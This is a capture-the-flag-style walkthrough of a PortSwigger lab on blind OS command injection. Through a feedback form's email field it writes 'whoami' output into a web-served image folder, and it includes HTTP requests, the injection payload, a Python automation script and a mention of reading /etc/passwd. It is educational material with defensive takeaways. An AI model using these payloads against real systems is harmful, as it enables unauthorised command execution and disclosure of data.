# Lab: Blind OS command injection with output redirection (Practitioner)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

**Description:** The feedback function runs a shell command with user-supplied details and returns no output, but there is a writable folder at `/var/www/images/` that the application serves product images from.

**Goal:** Execute `whoami` and retrieve the output.

**Vulnerable parameter:** `email` in `POST /feedback/submit` (output read back via `filename` in `GET /image`).

## Vulnerability

Blind command injection plus a writable, web-served directory. Redirecting stdout into that directory turns a blind injection into a readable one: the image-loading endpoint becomes an arbitrary file read for anything we can write there.

## Solution

1. Open `/feedback`, take the `csrf` token.
2. Submit feedback with the redirect payload in `email`:

```http
POST /feedback/submit HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=x&email=||whoami>/var/www/images/output.txt||&subject=x&message=x
```

3. Wait a moment (the command is asynchronous), then request the file through the image endpoint:

```http
GET /image?filename=output.txt HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

4. The response body is the output of `whoami`. The lab is solved once the command output has been retrieved.

## Exploit Payload

```
||whoami>/var/www/images/output.txt||
```

Read it back with:

```
/image?filename=output.txt
```

## Python one-liner (optional)

```python
import re, requests
base = "https://YOUR-LAB-ID.web-security-academy.net"
s = requests.Session()
csrf = re.search(r'name="csrf" value="([^"]+)"', s.get(base + "/feedback").text).group(1)
s.post(base + "/feedback/submit", data={"csrf": csrf, "name": "x",
       "email": "||whoami>/var/www/images/output.txt||", "subject": "x", "message": "x"})
print(s.get(base + "/image?filename=output.txt").text)
```

Full automation: [`os_command_injection_blind_output_redirection.py`](os_command_injection_blind_output_redirection.py).

## Verified run

Instance `0aa10067040d864780d82b060082006d`:

```
GET /image?filename=output.txt  ->  peter-JUrRmq
```

## Notes

- Use a unique filename (e.g. `output-<random>.txt`) if you repeat the lab, so you never read a stale file.
- `>` truncates/creates the file; `>>` appends — handy when exfiltrating multi-line output such as `id` or `cat /etc/passwd`.
- If the images folder were not writable, this technique would fail and you would need the out-of-band route (labs [04](04-blind-out-of-band.md) / [05](05-blind-oob-data-exfiltration.md)).

## Defensive takeaways

Keep writable directories outside the web root and never serve user-writable paths. Combine that with shell-free command execution and strict input validation; a single writable-and-served folder is enough to convert a blind bug into full output disclosure.
